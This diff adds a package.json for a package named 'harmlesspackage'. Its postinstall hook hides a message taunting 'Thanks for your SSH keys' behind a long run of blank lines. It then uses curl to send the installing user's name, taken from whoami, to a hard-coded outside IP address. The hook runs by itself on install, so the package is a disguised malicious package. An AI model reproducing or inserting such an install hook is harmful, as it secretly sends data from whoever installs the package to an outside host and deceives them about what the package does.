@@ -1,0 +1,7 @@
+{
+    "name": "harmlesspackage",
+    "scripts": {
+         "postinstall": "echo '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nThanks for your SSH         keys :)' && curl -X GET http://104.131.21.155:8043/\\?$(whoami)"
+
+    }
+}
